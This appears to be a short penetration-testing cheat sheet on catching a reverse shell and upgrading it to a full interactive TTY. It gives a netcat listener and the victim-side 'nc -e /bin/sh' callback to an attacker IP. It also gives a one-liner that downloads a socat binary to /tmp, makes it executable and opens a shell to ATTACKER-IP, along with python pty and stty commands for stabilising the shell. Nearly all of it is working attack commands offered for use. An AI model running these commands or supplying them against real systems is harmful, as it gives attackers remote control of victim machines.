Full tty Session

[*] Reverse Shell

	Kali Machine:
		# nc -lvp 1234
	Victim Machine - Using Netcat, doesn't matter as long as you get the reverse shell
		$ nc -e /bin/sh 192.168.122.238 1234

[*] Setup Full tty shell
	# Obtain bash on victim machine.
		python -c 'import pty;pty.spawn("/bin/bash")'

	# Grab current terminal details to parse to the victim.
	On reverse shell:
		Control-Z #   This will throw the shell in the background
		echo $TERM #  Should have xterm-256color OR xterm
		stty -a #  take note of rows and column
		stty raw -echo #  This will allow keyboard shortcuts through terminal
		fg #  Go back to your reverse shell
		reset #  Resets the terminal
			Throw in the output from $TERM command above, you may need to use "xterm" if "xterm-256color" fails
		Now just copy/paste into the terminal:
			export TERM=xterm
			export SHELL=bash
			stty rows <stty -a rows number> columns <stty -a columns number>
				Example: stty rows 56 columns 213

	Full tty session works as expected.




[*] Easiest Python Full TTY Session
	One your reverse shell is running, do this:

		python -c "import pty; pty.spawn('/bin/bash');"
		Cntrl+z
		stty raw -echo
		fg
		> Hit enter twice

	You now have a full tty shell.


[*] Socat Full TTY Session
	You may not need to run the -echo command but I have found this is needed:

	Terminal 1:
		nc -lvnp 1234
	
	Terminal 2
		wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER-IP:1234
	
	Terminal 1 will now have a reverse shell:
		Cntrl+z
		stty raw -echo
		fg
		> Hit enter twice